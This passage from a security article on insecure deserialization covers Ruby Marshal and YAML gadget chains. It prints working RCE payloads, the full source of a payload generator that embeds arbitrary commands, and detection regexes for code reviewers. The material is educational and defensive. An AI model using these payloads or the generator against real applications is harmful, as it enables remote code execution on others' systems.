        <span class="nx">deser</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
    <span class="p">});</span>
<span class="p">}</span>
</pre></div>

<p><strong>Tips for Source Code reviewers</strong></p>
<p>For NodeJS application, it&rsquo;s very difficult to advice on common strategies to get this kind of issues, as many libraries exist and many may be created in the future. Even though, as a general recommendation, it is usually a good idea to start searching the code for common regexes, like: </p>
<ul>
<li><code>(unserialize|parse)\s*\(</code></li>
<li><code>(node-serialize|funcster|serialize-to-js|cryo)</code></li>
</ul>
<p>For each match, the code should be manually inspected to see whether the object being deserialized can be manipulated by an external attacker.</p>
<h4 id="references_4">References<a class="headerlink" href="#references_4" title="Permanent link"></a></h4>
<ul>
<li><a href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/">https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/</a></li>
</ul>
<h3 id="ruby">Ruby<a class="headerlink" href="#ruby" title="Permanent link"></a></h3>
<p>Ruby, as all the programming languages we saw previously, offer serialization support, both hybrid (with Marshal) and pure text-based (mainly JSON or YAML). Within the years, two main vulnerabilities were found in Ruby that allowed RCE during the deserialization process. The affected functions were:</p>
<ul>
<li>Marshal.load()</li>
<li>YAML.load()</li>
</ul>
<p><strong>Marshal</strong></p>
<p>Originally, this vulnerability was found by <strong>Charlie Somerville</strong> during a research against Ruby on Rails, which leaded to the discovery of a gadget chain based on the <code>rails</code> module. However, the chain as it was, presented some major fallbacks:</p>
<ul>
<li>ActiveSupport gem must be loaded</li>
<li>ERB from stdlib must be loaded</li>
<li>After deserialization, a method that doesn&rsquo;t exist must be called on the deserialized object</li>
</ul>
<p>The above fallbacks doesn&rsquo;t affect the payload from working within Ruby on Rails app, as the requirements are easily fulfilled. However, they would be show stoppers for any other Ruby Application. If you want to test it, you can use the following command, seeing that it works only if we previously load <code>rails/all</code>:</p>
<ul>
<li>Without <code>require 'rails/all'</code></li>
</ul>
<p><div class="codehilite"><pre><span class="nv">$ </span>ruby -e <span class="s1">&#39;Marshal.load(&quot;\u0004\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\a:\u000E@instanceo:\bERB\u0006:\t@srcI\&quot;\u0018eval(`puts \&quot;TEST\&quot;`)\u0006:\u0006ET:\f@method:\vresult&quot;)&#39;</span>

Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
        1: from -e:1:in <span class="sb">`</span>&lt;main&gt;<span class="s1">&#39;</span>
<span class="s1">-e:1:in `load&#39;</span>: undefined class/module ActiveSupport:: <span class="o">(</span>ArgumentError<span class="o">)</span>
</pre></div>
* With <code>require 'rails/all'</code></p>
<div class="codehilite"><pre><span class="nv">$ </span>ruby -e <span class="s1">&#39;require &quot;rails/all&quot;;Marshal.load(&quot;\u0004\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\a:\u000E@instanceo:\bERB\u0006:\t@srcI\&quot;\u0018eval(`puts \&quot;TEST\&quot;`)\u0006:\u0006ET:\f@method:\vresult&quot;)&#39;</span>

<span class="c1"># May result in TypeError: Implicit Conversion of nil to int (in this case downgrade Ruby)</span>
TEST
</pre></div>

<p>However, a relatively new research, made by <strong>Luke Jahnke</strong>, lead to the discovery of a POP gadget chain working with Ruby standard libs only, without any previous requirement and not relying on any additional module.</p>
<p>As described in the original research, which can be found <a href="https://www.elttam.com/blog/ruby-deserialization/">here</a>, the POP gadget chain is built leveraging functions which then results in the <code>Kernel.open</code> being called with an arbitrary command. The full execution path can be summarised as following:</p>
<ol>
<li>Gem::Requirement -&gt; calls <a class="magiclink magiclink-github magiclink-mention" href="https://github.com/requirements" title="GitHub User: requirements">@requirements</a>.each (list of object)</li>
<li>Gem::DependencyList -&gt; used as list, calls <a class="magiclink magiclink-github magiclink-mention" href="https://github.com/specs" title="GitHub User: specs">@specs</a>.sort (sort requires a comparator)</li>
<li>Gem::Source::SpecificFile -&gt; implements a suitable comparator (&lt;=&gt; three way comparison operator) that calls <a class="magiclink magiclink-github magiclink-mention" href="https://github.com/spec" title="GitHub User: spec">@spec</a>.name</li>
<li>Gem::StubSpecification -&gt; implementation of name calls data.name -&gt; calls Kernel.open(<a class="magiclink magiclink-github magiclink-mention" href="https://github.com/loaded_from" title="GitHub User: loaded_from">@loaded_from</a>)</li>
<li>RCE is achieved by manipulating <a class="magiclink magiclink-github magiclink-mention" href="https://github.com/loaded_from" title="GitHub User: loaded_from">@loaded_from</a> with a command</li>
</ol>
<p>The script provided by the researcher, generates the hex version and the base64 version of the payload, for the static command &ldquo;id&rdquo;. The payload may be found even on <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md">PayloadAllTheThings</a>.</p>
<p>To test it, it is enough to launch the following command:</p>
<div class="codehilite"><pre><span class="nv">$ </span>ruby -e <span class="s1">&#39;Marshal.load([&quot;0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d4922167c636d64202f632063616c6320313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446&quot;].pack(&quot;H*&quot;)) rescue nil&#39;</span>
</pre></div>

<p>However, the script provided shows a list of drawbacks:</p>
<ul>
<li><strong>Executes</strong> the payload on the attacker machine multiple times</li>
<li>Does not offer dynamic generation (with custom commands)</li>
<li>Can be used only for Marshal payloads</li>
</ul>
<p><strong>YAML</strong></p>
<p>It may sound trivial, but the same chain can be applied to the <code>YAML.load()</code> function as well. If you accessed <strong>PayloadAllTheThings</strong> previously, you probably noticed the following YAML payload:</p>
<div class="codehilite"><pre><span class="nn">---</span> <span class="kt">!ruby</span><span class="l l-Scalar l-Scalar-Plain">/object:Gem::Requirement</span>
<span class="l l-Scalar l-Scalar-Plain">requirements</span><span class="p p-Indicator">:</span>
  <span class="kt">!ruby</span><span class="l l-Scalar l-Scalar-Plain">/object:Gem::DependencyList</span>
  <span class="l l-Scalar l-Scalar-Plain">specs</span><span class="p p-Indicator">:</span>
  <span class="p p-Indicator">-</span> <span class="kt">!ruby</span><span class="l l-Scalar l-Scalar-Plain">/object:Gem::Source::SpecificFile</span>
    <span class="l l-Scalar l-Scalar-Plain">spec</span><span class="p p-Indicator">:</span> <span class="nl">&amp;1</span> <span class="kt">!ruby</span><span class="l l-Scalar l-Scalar-Plain">/object:Gem::StubSpecification</span>
      <span class="l l-Scalar l-Scalar-Plain">loaded_from</span><span class="p p-Indicator">:</span> <span class="s">&quot;|id</span><span class="nv"> </span><span class="s">1&gt;&amp;2&quot;</span>
  <span class="p p-Indicator">-</span> <span class="kt">!ruby</span><span class="l l-Scalar l-Scalar-Plain">/object:Gem::Source::SpecificFile</span>
      <span class="l l-Scalar l-Scalar-Plain">spec</span><span class="p p-Indicator">:</span>
</pre></div>

<p>Now, if you pay attention at it, you will easily understand that it&rsquo;s working exactly the same way as the previously explained payload for Marshal.</p>
<p>The payload has been created by another security researcher name <strong>Etienne Stalmans (aka STRAALDRAAD)</strong>, his full research can be found <a href="https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/">here</a>.
However, a as you can read from his research, the payload was created &ldquo;manually&rdquo;. If you wonder why, the research explained that using the original script for the Marshal payload, of course changing the call to <code>Marshal.dump</code> with <code>YAML.dump</code>, produced a not working (incomplete) payload. I was personally disappointed by this approach, as the script could easily be fixed.
The main problem was the use of global variables (<code>$-</code>prefixed variables) with <code>YAML.dump</code>, which force the payload to be executed during serialization (which is necessary to generate the correct payload with <code>Marshal.dump</code>), but would prevent the yaml payload from being generated (as an exception would show before the end of the function). Transforming the global variable in a local one, and rebuilding the object for serialization, successfully solved the issue.</p>
<p>For the sake of completeness and to provide an example of what I said above, I wrote the following tool, named <strong>desert-ruby</strong>, that could be used to dynamically generate valid payloads for both Marshal and YAML of Ruby, using the <strong>Universal Ruby 2.x RCE Gadget Chain</strong>. The tool can also be downloaded <a href="https://github.com/klezVirus/deser-ruby">here</a>. </p>
<div class="codehilite"><pre><span class="ch">#!/usr/bin/env ruby</span>
<span class="nb">require</span> <span class="s1">&#39;optparse&#39;</span>
<span class="nb">require</span> <span class="s1">&#39;yaml&#39;</span>

<span class="no">Options</span> <span class="o">=</span> <span class="no">Struct</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="ss">:save</span><span class="p">,</span><span class="ss">:encode</span><span class="p">,</span><span class="ss">:yaml</span><span class="p">,</span><span class="ss">:command</span><span class="p">,</span><span class="ss">:test</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">Parser</span>
  <span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">parse</span><span class="p">(</span><span class="n">options</span><span class="p">)</span>
    <span class="n">args</span> <span class="o">=</span> <span class="no">Options</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&quot;Ruby RCE deserialization payload generator&quot;</span><span class="p">)</span>

    <span class="n">opt_parser</span> <span class="o">=</span> <span class="no">OptionParser</span><span class="o">.</span><span class="n">new</span> <span class="k">do</span> <span class="o">|</span><span class="n">opts</span><span class="o">|</span>
      <span class="n">opts</span><span class="o">.</span><span class="n">banner</span> <span class="o">=</span> <span class="s2">&quot;Usage: serializer.rb [options]&quot;</span>

      <span class="n">opts</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;-sFILE&quot;</span><span class="p">,</span> <span class="s2">&quot;--save=FILE&quot;</span><span class="p">,</span> <span class="s2">&quot;File to store payload (default=payload)&quot;</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">f</span><span class="o">|</span>
        <span class="n">args</span><span class="o">.</span><span class="n">save</span> <span class="o">=</span> <span class="n">f</span>
      <span class="k">end</span>
      <span class="n">opts</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;-y&quot;</span><span class="p">,</span> <span class="s2">&quot;--yaml&quot;</span><span class="p">,</span> <span class="s2">&quot;Generate YAML payload (default is False)&quot;</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">y</span><span class="o">|</span>
        <span class="n">args</span><span class="o">.</span><span class="n">yaml</span> <span class="o">=</span> <span class="n">y</span>
      <span class="k">end</span>
      <span class="n">opts</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;-t&quot;</span><span class="p">,</span> <span class="s2">&quot;--test&quot;</span><span class="p">,</span> <span class="s2">&quot;Attempt payload deserialization&quot;</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">t</span><span class="o">|</span>
        <span class="n">args</span><span class="o">.</span><span class="n">test</span> <span class="o">=</span> <span class="n">t</span>
      <span class="k">end</span>
      <span class="n">opts</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;-cCOMMAND&quot;</span><span class="p">,</span> <span class="s2">&quot;--command=COMMAND&quot;</span><span class="p">,</span> <span class="s2">&quot;Command to execute&quot;</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">c</span><span class="o">|</span>
        <span class="n">args</span><span class="o">.</span><span class="n">command</span> <span class="o">=</span> <span class="n">c</span>
      <span class="k">end</span>
      <span class="n">opts</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;-eENCODE&quot;</span><span class="p">,</span> <span class="s2">&quot;--encode=ENCODE&quot;</span><span class="p">,</span> <span class="s2">&quot;Encode payload (base64|hex)&quot;</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">e</span><span class="o">|</span>
        <span class="n">args</span><span class="o">.</span><span class="n">encode</span> <span class="o">=</span> <span class="n">e</span>
      <span class="k">end</span>
      <span class="n">opts</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;-h&quot;</span><span class="p">,</span> <span class="s2">&quot;--help&quot;</span><span class="p">,</span> <span class="s2">&quot;Prints this help&quot;</span><span class="p">)</span> <span class="k">do</span>
        <span class="nb">puts</span> <span class="n">opts</span>
        <span class="nb">exit</span>
      <span class="k">end</span>
    <span class="k">end</span>

    <span class="n">opt_parser</span><span class="o">.</span><span class="n">parse!</span><span class="p">(</span><span class="n">options</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">args</span>
  <span class="k">end</span>
<span class="k">end</span>

<span class="k">class</span> <span class="nc">Tester</span>
    <span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">test</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_file</span><span class="p">)</span>
        <span class="nb">puts</span> <span class="s2">&quot;[*] Deserializing payload &quot;</span><span class="o">+</span> <span class="n">type</span> <span class="o">+</span><span class="s2">&quot; in place&quot;</span>
        <span class="k">if</span> <span class="n">type</span> <span class="o">==</span> <span class="s2">&quot;yaml&quot;</span> <span class="k">then</span>
            <span class="c1"># If we have an exception, we&#39;re quite sure we triggered the RCE</span>
            <span class="no">YAML</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="no">File</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">payload_file</span><span class="p">))</span> <span class="k">rescue</span> <span class="p">(</span><span class="nb">puts</span> <span class="s2">&quot;[+] Payload Executed Successfully&quot;</span><span class="p">)</span>
        <span class="k">else</span>
            <span class="no">Marshal</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="k">rescue</span> <span class="kp">nil</span>
        <span class="k">end</span>
        <span class="nb">puts</span> <span class="s2">&quot;[*] Deserializing payload &quot;</span> <span class="o">+</span> <span class="n">type</span> <span class="o">+</span> <span class="s2">&quot; in new process&quot;</span>
        <span class="k">if</span> <span class="n">type</span> <span class="o">==</span> <span class="s2">&quot;yaml&quot;</span> <span class="k">then</span>
            <span class="c1"># If we triggered an exception above, this one should execute the command and print a visible result (and exception)</span>
            <span class="n">cmd_string</span> <span class="o">=</span> <span class="s2">&quot;require &#39;yaml&#39;;YAML.load(File.read(&#39;&quot;</span><span class="o">+</span><span class="n">payload_file</span><span class="o">+</span><span class="s2">&quot;&#39;))&quot;</span>
            <span class="nb">puts</span> <span class="n">cmd_string</span>
            <span class="nb">puts</span> <span class="no">IO</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="o">[</span><span class="s2">&quot;ruby&quot;</span><span class="p">,</span><span class="s2">&quot;-e&quot;</span><span class="p">,</span> <span class="n">cmd_string</span><span class="o">]</span><span class="p">)</span><span class="o">.</span><span class="n">read</span>
        <span class="k">else</span>
            <span class="n">cmd_string</span> <span class="o">=</span> <span class="s2">&quot;&#39;Marshal.load(STDIN.read) rescue nil&#39;&quot;</span>
            <span class="no">IO</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">cmd_string</span><span class="p">,</span> <span class="s2">&quot;r+&quot;</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">pipe</span><span class="o">|</span>
                <span class="n">pipe</span><span class="o">.</span><span class="n">print</span> <span class="n">payload</span>
                <span class="n">pipe</span><span class="o">.</span><span class="n">close_write</span>
                <span class="nb">puts</span> <span class="n">pipe</span><span class="o">.</span><span class="n">gets</span>
                <span class="nb">puts</span>
            <span class="k">end</span>
        <span class="k">end</span>
    <span class="k">end</span>
<span class="k">end</span>

<span class="n">args</span> <span class="o">=</span> <span class="no">Parser</span><span class="o">.</span><span class="n">parse</span> <span class="no">ARGV</span>

<span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">[</span><span class="ss">:command</span><span class="o">]</span> <span class="k">then</span>
    <span class="nb">abort</span><span class="p">(</span><span class="s2">&quot;[-] Command required&quot;</span><span class="p">)</span>
<span class="k">else</span>
    <span class="n">command_length</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">command</span><span class="o">.</span><span class="n">length</span>
    <span class="n">command</span> <span class="o">=</span> <span class="s2">&quot;|&quot;</span><span class="o">+</span><span class="n">args</span><span class="o">.</span><span class="n">command</span><span class="o">+</span><span class="s2">&quot; 1&gt;&amp;2&quot;</span>
<span class="k">end</span>

<span class="k">class</span> <span class="nc">Gem</span><span class="o">::</span><span class="no">StubSpecification</span>
    <span class="k">def</span> <span class="nf">initialize</span><span class="p">;</span> <span class="k">end</span>
<span class="k">end</span>

<span class="n">command_tag</span> <span class="o">=</span> <span class="s2">&quot;|echo &quot;</span> <span class="o">+</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">command_length</span><span class="o">-</span><span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot; 1&gt;&amp;2&quot;</span>
<span class="n">stub_specification</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">StubSpecification</span><span class="o">.</span><span class="n">new</span>
<span class="n">stub_specification</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="ss">:@loaded_from</span><span class="p">,</span> <span class="n">command_tag</span><span class="p">)</span>

<span class="nb">puts</span> <span class="s2">&quot;[+] Building payload&quot;</span>
<span class="n">stub_specification</span><span class="o">.</span><span class="n">name</span> <span class="k">rescue</span> <span class="kp">nil</span>

<span class="k">class</span> <span class="nc">Gem</span><span class="o">::</span><span class="no">Source</span><span class="o">::</span><span class="no">SpecificFile</span>
    <span class="k">def</span> <span class="nf">initialize</span><span class="p">;</span> <span class="k">end</span>
<span class="k">end</span>

<span class="n">specific_file</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">Source</span><span class="o">::</span><span class="no">SpecificFile</span><span class="o">.</span><span class="n">new</span>
<span class="n">specific_file</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="ss">:@spec</span><span class="p">,</span> <span class="n">stub_specification</span><span class="p">)</span>

<span class="n">other_specific_file</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">Source</span><span class="o">::</span><span class="no">SpecificFile</span><span class="o">.</span><span class="n">new</span>

<span class="n">specific_file</span> <span class="o">&lt;=&gt;</span> <span class="n">other_specific_file</span> <span class="k">rescue</span> <span class="kp">nil</span>

<span class="vg">$dependency_list</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">DependencyList</span><span class="o">.</span><span class="n">new</span>
<span class="vg">$dependency_list</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="ss">:@specs</span><span class="p">,</span> <span class="o">[</span><span class="n">specific_file</span><span class="p">,</span> <span class="n">other_specific_file</span><span class="o">]</span><span class="p">)</span>

<span class="vg">$dependency_list</span><span class="o">.</span><span class="n">each</span><span class="p">{}</span> <span class="k">rescue</span> <span class="kp">nil</span>
<span class="n">dependency_list</span> <span class="o">=</span> <span class="vg">$dependency_list</span>

<span class="k">class</span> <span class="nc">Gem</span><span class="o">::</span><span class="no">Requirement</span>
    <span class="k">def</span> <span class="nf">marshal_dump</span>
        <span class="o">[</span><span class="vg">$dependency_list</span><span class="o">]</span>
    <span class="k">end</span>
<span class="k">end</span>

<span class="n">payload</span> <span class="o">=</span> <span class="no">Marshal</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="no">Gem</span><span class="o">::</span><span class="no">Requirement</span><span class="o">.</span><span class="n">new</span><span class="p">)</span>

<span class="n">type</span> <span class="o">=</span> <span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">yaml</span> <span class="p">?</span> <span class="s2">&quot;yaml&quot;</span> <span class="p">:</span> <span class="s2">&quot;marshal&quot;</span><span class="p">)</span>
<span class="k">if</span> <span class="n">type</span> <span class="o">==</span> <span class="s2">&quot;yaml&quot;</span> <span class="k">then</span>
    <span class="n">ext</span> <span class="o">=</span> <span class="s2">&quot;.yml&quot;</span>
    <span class="n">gem</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">Requirement</span><span class="o">.</span><span class="n">new</span>
    <span class="n">gem</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="ss">:@requirements</span><span class="p">,</span> <span class="o">[</span><span class="n">dependency_list</span><span class="o">]</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="no">YAML</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">gem</span><span class="p">)</span>
<span class="k">else</span>
    <span class="n">ext</span> <span class="o">=</span> <span class="s2">&quot;.raw&quot;</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="no">Marshal</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="no">Gem</span><span class="o">::</span><span class="no">Requirement</span><span class="o">.</span><span class="n">new</span><span class="p">)</span>
<span class="k">end</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">gsub</span><span class="p">(</span><span class="n">command_tag</span><span class="p">,</span><span class="n">command</span><span class="p">)</span>


<span class="k">if</span> <span class="n">args</span><span class="o">[</span><span class="ss">:save</span><span class="o">]</span>
    <span class="n">payload_file</span> <span class="o">=</span> <span class="n">args</span><span class="o">[</span><span class="ss">:save</span><span class="o">]</span> <span class="o">+</span> <span class="n">ext</span>
    <span class="no">File</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">payload_file</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="p">{</span> <span class="o">|</span><span class="n">file</span><span class="o">|</span> <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="p">}</span>
<span class="k">end</span>

<span class="k">if</span> <span class="n">args</span><span class="o">[</span><span class="ss">:test</span><span class="o">]</span> <span class="k">then</span>
    <span class="nb">puts</span> <span class="s2">&quot;[+] Deserializing payload&quot;</span>
    <span class="no">Tester</span><span class="o">.</span><span class="n">test</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_file</span><span class="p">)</span>
<span class="k">end</span>

<span class="nb">print</span> <span class="n">args</span><span class="o">.</span><span class="n">encode</span>
<span class="n">encode</span> <span class="o">=</span> <span class="p">(</span> <span class="n">args</span><span class="o">[</span><span class="ss">:encode</span><span class="o">]</span> <span class="p">?</span> <span class="n">args</span><span class="o">[</span><span class="ss">:encode</span><span class="o">]</span> <span class="p">:</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> 

<span class="k">if</span> <span class="n">encode</span> <span class="o">==</span> <span class="s2">&quot;hex&quot;</span> <span class="k">then</span>
    <span class="nb">puts</span> <span class="s2">&quot;Payload (hex):&quot;</span>
    <span class="nb">puts</span> <span class="n">payload</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;H*&#39;</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
    <span class="nb">puts</span>
<span class="k">elsif</span> <span class="n">encode</span> <span class="o">==</span> <span class="s2">&quot;base64&quot;</span>
    <span class="nb">require</span> <span class="s1">&#39;base64&#39;</span>
    <span class="nb">puts</span> <span class="s2">&quot;Payload (base64):&quot;</span>
    <span class="nb">puts</span> <span class="no">Base64</span><span class="o">.</span><span class="n">encode64</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="nb">puts</span>
<span class="k">else</span>
    <span class="nb">puts</span> <span class="s2">&quot;Payload (raw):&quot;</span>
    <span class="nb">puts</span> <span class="n">payload</span>
    <span class="nb">puts</span>
<span class="k">end</span>
</pre></div>

<p>We can generate the YAML payload with:</p>
<div class="codehilite"><pre> ruby serializer.rb -c <span class="s2">&quot;cmd /c calc&quot;</span> -y -s payload 
</pre></div>

<p>To test the payload, let&rsquo;s run:</p>
<div class="codehilite"><pre>ruby -e <span class="s2">&quot;require &#39;yaml&#39;; YAML.load(File.read(&#39;payload.yml&#39;))&quot;</span>
</pre></div>

<p>A calculator will spawn on the hosting system.</p>
<p><strong>Tips for Source Code reviewers</strong></p>
<p>To find this kind of vulnerability it is usually a good start to search the code for common regexes, like: </p>
<ul>
<li><code>(Marshal.load|YAML.load)\s*\(</code></li>
</ul>
<p>For each match, the code should be manually inspected to see whether the object being deserialized can be manipulated by an external attacker.</p>
<h4 id="references_5">References<a class="headerlink" href="#references_5" title="Permanent link"></a></h4>
<ul>
<li><a href="https://www.elttam.com/blog/ruby-deserialization/">Universal RCE for Ruby 2.x</a></li>
<li><a href="https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/">Universal RCE for Ruby2.x - YAML</a></li>
</ul></article></body></html>